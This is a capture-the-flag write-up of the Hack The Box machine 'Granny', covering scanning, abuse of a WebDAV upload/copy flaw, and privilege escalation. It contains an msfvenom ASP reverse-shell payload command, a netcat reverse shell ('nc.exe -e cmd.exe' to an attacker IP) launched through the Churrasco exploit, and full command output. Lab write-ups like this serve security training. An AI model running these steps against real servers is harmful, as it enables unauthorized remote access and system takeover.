---
title: Hack The Box - Granny (Without Metasploit)
date: 2021-01-16 00:19:00 +0800
categories: [hackthebox]
tags: [windows, webdav, churrsasco]
---

![](/assets/images/granny.png){:height="414px" width="615px"}

# Configuration

The operating system that I will be using to tackle this machine is a Kali Linux VM.

What I learnt from other writeups is that it was a good habit to map a domain name to the machine's IP address so as that it will be easier to remember. This can done by appending a line to `/etc/hosts`.

```bash
$ echo "10.10.10.15 granny.htb" | sudo tee -a /etc/hosts
```

# Reconnaissance

```bash 
$ rustscan --accessible -a granny.htb -r 1-65535 -- -sT -sV -sC -Pn
File limit higher than batch size. Can increase speed by increasing batch size '-b 1048476'.
Open 10.10.10.15:80
Starting Script(s)
Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Starting Nmap 7.80 ( https://nmap.org ) at 2021-01-15 14:21 UTC
NSE: Loaded 151 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 14:21
Completed NSE at 14:21, 0.01s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 14:21
Completed NSE at 14:21, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 14:21
Completed NSE at 14:21, 0.00s elapsed
Initiating Connect Scan at 14:21
Scanning granny.htb (10.10.10.15) [1 port]
Discovered open port 80/tcp on 10.10.10.15
Completed Connect Scan at 14:21, 0.01s elapsed (1 total ports)
Initiating Service scan at 14:21
Scanning 1 service on granny.htb (10.10.10.15)
Completed Service scan at 14:21, 6.04s elapsed (1 service on 1 host)
NSE: Script scanning 10.10.10.15.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 14:21
Completed NSE at 14:21, 0.32s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 14:21
Completed NSE at 14:21, 0.03s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 14:21
Completed NSE at 14:21, 0.00s elapsed
Nmap scan report for granny.htb (10.10.10.15)
Host is up, received user-set (0.0097s latency).
Scanned at 2021-01-15 14:21:36 UTC for 7s

PORT   STATE SERVICE REASON  VERSION
80/tcp open  http    syn-ack Microsoft IIS httpd 6.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT POST
|_  Potentially risky methods: TRACE DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT
|_http-server-header: Microsoft-IIS/6.0
|_http-title: Under Construction
| http-webdav-scan: 
|   WebDAV type: Unknown
|   Server Type: Microsoft-IIS/6.0
|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK
|_  Server Date: Fri, 15 Jan 2021 14:21:43 GMT
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 14:21
Completed NSE at 14:21, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 14:21
Completed NSE at 14:21, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 14:21
Completed NSE at 14:21, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.95 seconds
```

# Enumeration (1)

## Port 80 `Microsoft IIS httpd 6.0`

![](/assets/images/granny1.png)

We are instantly informed that the website is undergoing contruction. If we run `nikto`, we see that `WebDAV` is enabled.

```
$ nikto -host http://granny.htb
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.10.15
+ Target Hostname:    granny.htb
+ Target Port:        80
+ Start Time:         2021-01-15 09:22:04 (GMT-5)
---------------------------------------------------------------------------
+ Server: Microsoft-IIS/6.0
+ Retrieved microsoftofficewebserver header: 5.0_Pub
+ Retrieved x-powered-by header: ASP.NET
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ Uncommon header 'microsoftofficewebserver' found, with contents: 5.0_Pub
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Retrieved x-aspnet-version header: 1.1.4322
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ OSVDB-397: HTTP method 'PUT' allows clients to save files on the web server.
+ OSVDB-5646: HTTP method 'DELETE' allows clients to delete files on the web server.
+ Retrieved dasl header: <DAV:sql>
+ Retrieved dav header: 1, 2
+ Retrieved ms-author-via header: MS-FP/4.0,DAV
+ Uncommon header 'ms-author-via' found, with contents: MS-FP/4.0,DAV
+ Allowed HTTP Methods: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH 
+ OSVDB-5646: HTTP method ('Allow' Header): 'DELETE' may allow clients to remove files on the web server.
+ OSVDB-397: HTTP method ('Allow' Header): 'PUT' method could allow clients to save files on the web server.
+ OSVDB-5647: HTTP method ('Allow' Header): 'MOVE' may allow clients to change file locations on the web server.
+ Public HTTP Methods: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH 
+ OSVDB-5646: HTTP method ('Public' Header): 'DELETE' may allow clients to remove files on the web server.
+ OSVDB-397: HTTP method ('Public' Header): 'PUT' method could allow clients to save files on the web server.
+ OSVDB-5647: HTTP method ('Public' Header): 'MOVE' may allow clients to change file locations on the web server.
+ WebDAV enabled (LOCK UNLOCK PROPFIND COPY MKCOL PROPPATCH SEARCH listed as allowed)
+ OSVDB-13431: PROPFIND HTTP verb may show the server's internal IP address: http://granny/_vti_bin/_vti_aut/author.dll
+ OSVDB-396: /_vti_bin/shtml.exe: Attackers may be able to crash FrontPage by requesting a DOS device, like shtml.exe/aux.htm -- a DoS was not attempted.
+ OSVDB-3233: /postinfo.html: Microsoft FrontPage default file found.
+ OSVDB-3233: /_private/: FrontPage directory found.
+ OSVDB-3233: /_vti_bin/: FrontPage directory found.
+ OSVDB-3233: /_vti_inf.html: FrontPage/SharePoint is installed and reveals its version number (check HTML source for more information).
+ OSVDB-3300: /_vti_bin/: shtml.exe/shtml.dll is available remotely. Some versions of the Front Page ISAPI filter are vulnerable to a DOS (not attempted).
+ OSVDB-3500: /_vti_bin/fpcount.exe: Frontpage counter CGI has been found. FP Server version 97 allows remote users to execute arbitrary system commands, though a vulnerability in this version could not be confirmed. http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-1999-1376. http://www.securityfocus.com/bid/2252.
+ OSVDB-67: /_vti_bin/shtml.dll/_vti_rpc: The anonymous FrontPage user is revealed through a crafted POST.
+ /_vti_bin/_vti_adm/admin.dll: FrontPage/SharePoint file found.
+ 7940 requests: 0 error(s) and 32 item(s) reported on remote host
+ End Time:           2021-01-15 09:23:59 (GMT-5) (115 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

Let use `davtest` to see if we can upload and executing any files on the web server. I will be using a more improved version from [here](https://github.com/cldrn/davtest).

```bash
$ perl davtest.pl -url http://granny.htb -move -copy -cleanup
********************************************************
 Testing DAV connection
OPEN            SUCCEED:                http://granny.htb
********************************************************
NOTE    Random string for this session: mFZimvbKg6
********************************************************
 Creating directory
MKCOL           SUCCEED:                Created http://granny.htb/DavTestDir_mFZimvbKg6
********************************************************
 Sending test files (MOVE method)
PUT     txt     SUCCEED:        http://granny.htb/DavTestDir_mFZimvbKg6/davtest_mFZimvbKg6_cgi.txt
MOVE    cgi     SUCCEED:        http://granny.htb/DavTestDir_mFZimvbKg6/davtest_mFZimvbKg6.cgi
MOVE    cgi     SUCCEED:        http://granny.htb/DavTestDir_mFZimvbKg6/davtest_mFZimvbKg6.cgi;.txt
PUT     txt     SUCCEED:        http://granny.htb/DavTestDir_mFZimvbKg6/davtest_mFZimvbKg6_shtml.txt
MOVE    shtml   SUCCEED:        http://granny.htb/DavTestDir_mFZimvbKg6/davtest_mFZimvbKg6.shtml
MOVE    shtml   SUCCEED:        http://granny.htb/DavTestDir_mFZimvbKg6/davtest_mFZimvbKg6.shtml;.txt
PUT     txt     SUCCEED:        http://granny.htb/DavTestDir_mFZimvbKg6/davtest_mFZimvbKg6_aspx.txt
MOVE    aspx    SUCCEED:        http://granny.htb/DavTestDir_mFZimvbKg6/davtest_mFZimvbKg6.aspx
MOVE    aspx    SUCCEED:        http://granny.htb/DavTestDir_mFZimvbKg6/davtest_mFZimvbKg6.aspx;.txt
PUT     txt     SUCCEED:        http://granny.htb/DavTestDir_mFZimvbKg6/davtest_mFZimvbKg6_cfm.txt
MOVE    cfm     SUCCEED:        http://granny.htb/DavTestDir_mFZimvbKg6/davtest_mFZimvbKg6.cfm
MOVE    cfm     SUCCEED:        http://granny.htb/DavTestDir_mFZimvbKg6/davtest_mFZimvbKg6.cfm;.txt
PUT     txt     SUCCEED:        http://granny.htb/DavTestDir_mFZimvbKg6/davtest_mFZimvbKg6_html.txt
MOVE    html    SUCCEED:        http://granny.htb/DavTestDir_mFZimvbKg6/davtest_mFZimvbKg6.html
MOVE    html    SUCCEED:        http://granny.htb/DavTestDir_mFZimvbKg6/davtest_mFZimvbKg6.html;.txt
PUT     txt     SUCCEED:        http://granny.htb/DavTestDir_mFZimvbKg6/davtest_mFZimvbKg6_asp.txt
MOVE    asp     SUCCEED:        http://granny.htb/DavTestDir_mFZimvbKg6/davtest_mFZimvbKg6.asp
MOVE    asp     SUCCEED:        http://granny.htb/DavTestDir_mFZimvbKg6/davtest_mFZimvbKg6.asp;.txt
PUT     txt     SUCCEED:        http://granny.htb/DavTestDir_mFZimvbKg6/davtest_mFZimvbKg6_php.txt
MOVE    php     SUCCEED:        http://granny.htb/DavTestDir_mFZimvbKg6/davtest_mFZimvbKg6.php
MOVE    php     SUCCEED:        http://granny.htb/DavTestDir_mFZimvbKg6/davtest_mFZimvbKg6.php;.txt
PUT     txt     SUCCEED:        http://granny.htb/DavTestDir_mFZimvbKg6/davtest_mFZimvbKg6_jsp.txt
MOVE    jsp     SUCCEED:        http://granny.htb/DavTestDir_mFZimvbKg6/davtest_mFZimvbKg6.jsp
MOVE    jsp     SUCCEED:        http://granny.htb/DavTestDir_mFZimvbKg6/davtest_mFZimvbKg6.jsp;.txt
PUT     txt     SUCCEED:        http://granny.htb/DavTestDir_mFZimvbKg6/davtest_mFZimvbKg6_txt.txt
MOVE    txt     SUCCEED:        http://granny.htb/DavTestDir_mFZimvbKg6/davtest_mFZimvbKg6.txt
MOVE    txt     SUCCEED:        http://granny.htb/DavTestDir_mFZimvbKg6/davtest_mFZimvbKg6.txt;.txt
PUT     txt     SUCCEED:        http://granny.htb/DavTestDir_mFZimvbKg6/davtest_mFZimvbKg6_jhtml.txt
MOVE    jhtml   SUCCEED:        http://granny.htb/DavTestDir_mFZimvbKg6/davtest_mFZimvbKg6.jhtml
MOVE    jhtml   SUCCEED:        http://granny.htb/DavTestDir_mFZimvbKg6/davtest_mFZimvbKg6.jhtml;.txt
PUT     txt     SUCCEED:        http://granny.htb/DavTestDir_mFZimvbKg6/davtest_mFZimvbKg6_pl.txt
MOVE    pl      SUCCEED:        http://granny.htb/DavTestDir_mFZimvbKg6/davtest_mFZimvbKg6.pl
MOVE    pl      SUCCEED:        http://granny.htb/DavTestDir_mFZimvbKg6/davtest_mFZimvbKg6.pl;.txt
********************************************************
 Sending test files (COPY method)
PUT     txt     SUCCEED:        http://granny.htb/DavTestDir_mFZimvbKg6/davtest_mFZimvbKg6_cgi.txt
COPY    cgi     SUCCEED:        http://granny.htb/DavTestDir_mFZimvbKg6/davtest_mFZimvbKg6.cgi
COPY    cgi     SUCCEED:        http://granny.htb/DavTestDir_mFZimvbKg6/davtest_mFZimvbKg6.cgi;.txt
PUT     txt     SUCCEED:        http://granny.htb/DavTestDir_mFZimvbKg6/davtest_mFZimvbKg6_shtml.txt
COPY    shtml   SUCCEED:        http://granny.htb/DavTestDir_mFZimvbKg6/davtest_mFZimvbKg6.shtml
COPY    shtml   SUCCEED:        http://granny.htb/DavTestDir_mFZimvbKg6/davtest_mFZimvbKg6.shtml;.txt
PUT     txt     SUCCEED:        http://granny.htb/DavTestDir_mFZimvbKg6/davtest_mFZimvbKg6_aspx.txt
COPY    aspx    SUCCEED:        http://granny.htb/DavTestDir_mFZimvbKg6/davtest_mFZimvbKg6.aspx
COPY    aspx    SUCCEED:        http://granny.htb/DavTestDir_mFZimvbKg6/davtest_mFZimvbKg6.aspx;.txt
PUT     txt     SUCCEED:        http://granny.htb/DavTestDir_mFZimvbKg6/davtest_mFZimvbKg6_cfm.txt
COPY    cfm     SUCCEED:        http://granny.htb/DavTestDir_mFZimvbKg6/davtest_mFZimvbKg6.cfm
COPY    cfm     SUCCEED:        http://granny.htb/DavTestDir_mFZimvbKg6/davtest_mFZimvbKg6.cfm;.txt
PUT     txt     SUCCEED:        http://granny.htb/DavTestDir_mFZimvbKg6/davtest_mFZimvbKg6_html.txt
COPY    html    SUCCEED:        http://granny.htb/DavTestDir_mFZimvbKg6/davtest_mFZimvbKg6.html
COPY    html    SUCCEED:        http://granny.htb/DavTestDir_mFZimvbKg6/davtest_mFZimvbKg6.html;.txt
PUT     txt     SUCCEED:        http://granny.htb/DavTestDir_mFZimvbKg6/davtest_mFZimvbKg6_asp.txt
COPY    asp     SUCCEED:        http://granny.htb/DavTestDir_mFZimvbKg6/davtest_mFZimvbKg6.asp
COPY    asp     SUCCEED:        http://granny.htb/DavTestDir_mFZimvbKg6/davtest_mFZimvbKg6.asp;.txt
PUT     txt     SUCCEED:        http://granny.htb/DavTestDir_mFZimvbKg6/davtest_mFZimvbKg6_php.txt
COPY    php     SUCCEED:        http://granny.htb/DavTestDir_mFZimvbKg6/davtest_mFZimvbKg6.php
COPY    php     SUCCEED:        http://granny.htb/DavTestDir_mFZimvbKg6/davtest_mFZimvbKg6.php;.txt
PUT     txt     SUCCEED:        http://granny.htb/DavTestDir_mFZimvbKg6/davtest_mFZimvbKg6_jsp.txt
COPY    jsp     SUCCEED:        http://granny.htb/DavTestDir_mFZimvbKg6/davtest_mFZimvbKg6.jsp
COPY    jsp     SUCCEED:        http://granny.htb/DavTestDir_mFZimvbKg6/davtest_mFZimvbKg6.jsp;.txt
PUT     txt     SUCCEED:        http://granny.htb/DavTestDir_mFZimvbKg6/davtest_mFZimvbKg6_txt.txt
COPY    txt     SUCCEED:        http://granny.htb/DavTestDir_mFZimvbKg6/davtest_mFZimvbKg6.txt
COPY    txt     SUCCEED:        http://granny.htb/DavTestDir_mFZimvbKg6/davtest_mFZimvbKg6.txt;.txt
PUT     txt     SUCCEED:        http://granny.htb/DavTestDir_mFZimvbKg6/davtest_mFZimvbKg6_jhtml.txt
COPY    jhtml   SUCCEED:        http://granny.htb/DavTestDir_mFZimvbKg6/davtest_mFZimvbKg6.jhtml
COPY    jhtml   SUCCEED:        http://granny.htb/DavTestDir_mFZimvbKg6/davtest_mFZimvbKg6.jhtml;.txt
PUT     txt     SUCCEED:        http://granny.htb/DavTestDir_mFZimvbKg6/davtest_mFZimvbKg6_pl.txt
COPY    pl      SUCCEED:        http://granny.htb/DavTestDir_mFZimvbKg6/davtest_mFZimvbKg6.pl
COPY    pl      SUCCEED:        http://granny.htb/DavTestDir_mFZimvbKg6/davtest_mFZimvbKg6.pl;.txt
********************************************************
 Checking for test file execution
EXEC    cgi     FAIL
EXEC    shtml   FAIL
EXEC    aspx    FAIL
EXEC    cfm     FAIL
EXEC    html    SUCCEED:        http://granny.htb/DavTestDir_mFZimvbKg6/davtest_mFZimvbKg6.html
EXEC    html    SUCCEED:        http://granny.htb/DavTestDir_mFZimvbKg6/davtest_mFZimvbKg6.html;.txt
EXEC    asp     SUCCEED:        http://granny.htb/DavTestDir_mFZimvbKg6/davtest_mFZimvbKg6.asp;.txt
EXEC    php     FAIL
EXEC    jsp     FAIL
EXEC    txt     SUCCEED:        http://granny.htb/DavTestDir_mFZimvbKg6/davtest_mFZimvbKg6.txt
EXEC    txt     SUCCEED:        http://granny.htb/DavTestDir_mFZimvbKg6/davtest_mFZimvbKg6.txt;.txt
EXEC    jhtml   FAIL
EXEC    pl      FAIL
********************************************************
 Cleaning up
DELETE          SUCCEED:        http://granny.htb/DavTestDir_mFZimvbKg6

********************************************************
davtest.pl Summary:
Created: http://granny.htb/DavTestDir_mFZimvbKg6
MOVE/PUT File: http://granny.htb/DavTestDir_mFZimvbKg6/davtest_mFZimvbKg6.cgi
MOVE/PUT File: http://granny.htb/DavTestDir_mFZimvbKg6/davtest_mFZimvbKg6.cgi;.txt
MOVE/PUT File: http://granny.htb/DavTestDir_mFZimvbKg6/davtest_mFZimvbKg6.shtml
MOVE/PUT File: http://granny.htb/DavTestDir_mFZimvbKg6/davtest_mFZimvbKg6.shtml;.txt
MOVE/PUT File: http://granny.htb/DavTestDir_mFZimvbKg6/davtest_mFZimvbKg6.aspx
MOVE/PUT File: http://granny.htb/DavTestDir_mFZimvbKg6/davtest_mFZimvbKg6.aspx;.txt
MOVE/PUT File: http://granny.htb/DavTestDir_mFZimvbKg6/davtest_mFZimvbKg6.cfm
MOVE/PUT File: http://granny.htb/DavTestDir_mFZimvbKg6/davtest_mFZimvbKg6.cfm;.txt
MOVE/PUT File: http://granny.htb/DavTestDir_mFZimvbKg6/davtest_mFZimvbKg6.html
MOVE/PUT File: http://granny.htb/DavTestDir_mFZimvbKg6/davtest_mFZimvbKg6.html;.txt
MOVE/PUT File: http://granny.htb/DavTestDir_mFZimvbKg6/davtest_mFZimvbKg6.asp
MOVE/PUT File: http://granny.htb/DavTestDir_mFZimvbKg6/davtest_mFZimvbKg6.asp;.txt
MOVE/PUT File: http://granny.htb/DavTestDir_mFZimvbKg6/davtest_mFZimvbKg6.php
MOVE/PUT File: http://granny.htb/DavTestDir_mFZimvbKg6/davtest_mFZimvbKg6.php;.txt
MOVE/PUT File: http://granny.htb/DavTestDir_mFZimvbKg6/davtest_mFZimvbKg6.jsp
MOVE/PUT File: http://granny.htb/DavTestDir_mFZimvbKg6/davtest_mFZimvbKg6.jsp;.txt
MOVE/PUT File: http://granny.htb/DavTestDir_mFZimvbKg6/davtest_mFZimvbKg6.txt
MOVE/PUT File: http://granny.htb/DavTestDir_mFZimvbKg6/davtest_mFZimvbKg6.txt;.txt
MOVE/PUT File: http://granny.htb/DavTestDir_mFZimvbKg6/davtest_mFZimvbKg6.jhtml
MOVE/PUT File: http://granny.htb/DavTestDir_mFZimvbKg6/davtest_mFZimvbKg6.jhtml;.txt
MOVE/PUT File: http://granny.htb/DavTestDir_mFZimvbKg6/davtest_mFZimvbKg6.pl
MOVE/PUT File: http://granny.htb/DavTestDir_mFZimvbKg6/davtest_mFZimvbKg6.pl;.txt
COPY/PUT File: http://granny.htb/DavTestDir_mFZimvbKg6/davtest_mFZimvbKg6.cgi
COPY/PUT File: http://granny.htb/DavTestDir_mFZimvbKg6/davtest_mFZimvbKg6.cgi;.txt
COPY/PUT File: http://granny.htb/DavTestDir_mFZimvbKg6/davtest_mFZimvbKg6.shtml
COPY/PUT File: http://granny.htb/DavTestDir_mFZimvbKg6/davtest_mFZimvbKg6.shtml;.txt
COPY/PUT File: http://granny.htb/DavTestDir_mFZimvbKg6/davtest_mFZimvbKg6.aspx
COPY/PUT File: http://granny.htb/DavTestDir_mFZimvbKg6/davtest_mFZimvbKg6.aspx;.txt
COPY/PUT File: http://granny.htb/DavTestDir_mFZimvbKg6/davtest_mFZimvbKg6.cfm
COPY/PUT File: http://granny.htb/DavTestDir_mFZimvbKg6/davtest_mFZimvbKg6.cfm;.txt
COPY/PUT File: http://granny.htb/DavTestDir_mFZimvbKg6/davtest_mFZimvbKg6.html
COPY/PUT File: http://granny.htb/DavTestDir_mFZimvbKg6/davtest_mFZimvbKg6.html;.txt
COPY/PUT File: http://granny.htb/DavTestDir_mFZimvbKg6/davtest_mFZimvbKg6.asp
COPY/PUT File: http://granny.htb/DavTestDir_mFZimvbKg6/davtest_mFZimvbKg6.asp;.txt
COPY/PUT File: http://granny.htb/DavTestDir_mFZimvbKg6/davtest_mFZimvbKg6.php
COPY/PUT File: http://granny.htb/DavTestDir_mFZimvbKg6/davtest_mFZimvbKg6.php;.txt
COPY/PUT File: http://granny.htb/DavTestDir_mFZimvbKg6/davtest_mFZimvbKg6.jsp
COPY/PUT File: http://granny.htb/DavTestDir_mFZimvbKg6/davtest_mFZimvbKg6.jsp;.txt
COPY/PUT File: http://granny.htb/DavTestDir_mFZimvbKg6/davtest_mFZimvbKg6.txt
COPY/PUT File: http://granny.htb/DavTestDir_mFZimvbKg6/davtest_mFZimvbKg6.txt;.txt
COPY/PUT File: http://granny.htb/DavTestDir_mFZimvbKg6/davtest_mFZimvbKg6.jhtml
COPY/PUT File: http://granny.htb/DavTestDir_mFZimvbKg6/davtest_mFZimvbKg6.jhtml;.txt
COPY/PUT File: http://granny.htb/DavTestDir_mFZimvbKg6/davtest_mFZimvbKg6.pl
COPY/PUT File: http://granny.htb/DavTestDir_mFZimvbKg6/davtest_mFZimvbKg6.pl;.txt
Executes: http://granny.htb/DavTestDir_mFZimvbKg6/davtest_mFZimvbKg6.html
Executes: http://granny.htb/DavTestDir_mFZimvbKg6/davtest_mFZimvbKg6.html;.txt
Executes: http://granny.htb/DavTestDir_mFZimvbKg6/davtest_mFZimvbKg6.asp;.txt
Executes: http://granny.htb/DavTestDir_mFZimvbKg6/davtest_mFZimvbKg6.txt
Executes: http://granny.htb/DavTestDir_mFZimvbKg6/davtest_mFZimvbKg6.txt;.txt
DELETED: http://granny.htb/DavTestDir_mFZimvbKg6
```

From the summary, we see that if we upload a `.txt` file and then perform a `COPY` on it such that the resulting extension will be `.asp`, the web server will run the copy as a `.asp` file! 

# Exploitation (1)

I will be using `msfvenom` to generate a `.asp` file that will spawn a reverse shell and use `cadaver` to upload our file and perform the copy.

```bash
$ msfvenom -p windows/shell_reverse_tcp LHOST=tun0 LPORT=1337 -f asp > shell.asp.txt
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of asp file: 38457 bytes

$ cadaver http://granny.htb/ 
dav:/> put shell.asp.txt
Uploading shell.asp.txt to `/shell.asp.txt':
Progress: [=============================>] 100.0% of 38457 bytes succeeded.
dav:/> copy shell.asp.txt shell.asp;.txt
Copying `/shell.asp.txt' to `/shell.asp%3b.txt':  succeeded.
```

Now, we start our `nc` listener.

```bash
$ rlwrap nc -lvnp 1337                
listening on [any] 1337 ...
```

And we visit `/shell.asp;.txt` to trigger the reverse shell connection to our listener.

```bash
$ rlwrap nc -lvnp 1337                
listening on [any] 1337 ...
connect to [10.10.XX.XX] from (UNKNOWN) [10.10.10.15] 1060
Microsoft Windows [Version 5.2.3790]
(C) Copyright 1985-2003 Microsoft Corp.

c:\windows\system32\inetsrv> whoami
whoami
nt authority\network service
```

Unfortunately, the connections die quite quickly (withint 3-4 minutes) and I tried different methods to make the connection last longer by spawning another reverse shell connection with `nc` or using `rundll32` on a `msfvenom` generated `.dll` file but it all didn't work. I guess we have to work with what I have.

Running `systeminfo`, we see that it is running `Windows Server 2003`. Checking `searchsploit`, we see that there is a privilege escalation exploit we can use!

```bash
$ searchsploit windows server 2003 privilege Escalation
------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                      |  Path
------------------------------------------------------------------------------------ ---------------------------------
Microsoft Windows Server 2000 - CreateFile API Named Pipe Privilege Escalation (1)  | windows/local/22882.c
Microsoft Windows Server 2000 - CreateFile API Named Pipe Privilege Escalation (2)  | windows/local/22883.c
Microsoft Windows Server 2003 - Token Kidnapping Local Privilege Escalation         | windows/local/6705.txt
```

We can get a binary called `Churrsaco.exe` from [here](https://github.com/Re4son/Churrasco/raw/master/churrasco.exe) which will take in a command and run it as `NT AUTHORITY/SYSTEM`. After transferring it over via `HTTP`, we can use it to run a reverse shell.

```
c:\windows\system32\inetsrv> C:\tmp\exp.exe "C:\\tmp\\nc.exe -e cmd.exe 10.10.14.7 1337"
```

Then on our listener that we set up beforehand, we get a shell as `SYSTEM`.

```bash
$ rlwrap nc -lvnp 1337
listening on [any] 1337 ...
connect to [10.10.XX.XX] from (UNKNOWN) [10.10.10.15] 1242
Microsoft Windows [Version 5.2.3790]
(C) Copyright 1985-2003 Microsoft Corp.

C:\WINDOWS\TEMP> whoami
whoami
nt authority\system
```

# user.txt

The user flag is in `Lakis`'s Desktop.

```
C:\WINDOWS\TEMP> type "C:\Documents and Settings\Lakis\Desktop\user.txt"
700cXXXXXXXXXXXXXXXXXXXXXXXXXXXX
```

# root.txt

The user flag is in `Administrator`'s Desktop.

```
C:\WINDOWS\TEMP> type "C:\Documents and Settings\Administrator\Desktop\root.txt"
aa4bXXXXXXXXXXXXXXXXXXXXXXXXXXXX
```

### Rooted ! Thank you for reading and look forward for more writeups and articles !